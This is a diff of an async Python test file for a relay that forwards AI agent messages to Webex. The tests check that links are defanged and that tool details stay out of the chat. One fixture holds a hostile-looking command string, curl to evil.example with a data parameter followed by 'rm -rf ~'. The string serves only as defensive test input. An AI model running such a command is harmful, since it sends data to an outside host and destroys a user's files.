@@ -69,7 +69,9 @@ async def test_agent_text_posted_to_webex_has_no_live_links(relay: Relay) -> Non
             harness=H, session_key=key, text="Open [the page](https://x.example/a?k=v) or https://y.example."
         )
     )
-    assert "Open the page (`https://x.example/a?k=v`) or `https://y.example`." in relay.bot_texts()
+    assert relay.thread_texts()[-1].startswith(
+        "Open the page (`https://x.example/a?k=v`) or `https://y.example`."
+    )
 
 
 async def test_relays_own_messages_are_not_rewritten(relay: Relay) -> None:
@@ -77,13 +79,12 @@ async def test_relays_own_messages_are_not_rewritten(relay: Relay) -> None:
     assert relay.bot_texts()[-1] == "Docs: https://relay.example/help"
 
 
-async def test_tool_lines_and_long_tool_details_are_neutralised_and_cut(relay: Relay) -> None:
+async def test_a_tools_detail_never_reaches_the_phone(relay: Relay) -> None:
     key = await _thread(relay)
     detail = "curl https://evil.example/?d=1 " + "z" * 2000 + " ; rm -rf ~"
     await relay.frontend.renderer.handle(
         ToolStarted(harness=H, session_key=key, tool_id="t1", name="bash", detail=detail)
     )
     await relay.frontend.renderer.handle(TurnCompleted(harness=H, session_key=key, text="done"))
-    line = next(ln for t in relay.bot_texts() for ln in t.splitlines() if ln.startswith("🔧 bash"))
-    assert "`https://evil.example/?d=1`" in line and line.endswith("; rm -rf ~")
-    assert "more chars" in line and len(line) < 400
+    assert relay.thread_texts() == ["done\n\n⏱ 0s · 🔧 1"]
+    assert "evil.example" not in "".join(relay.bot_texts())
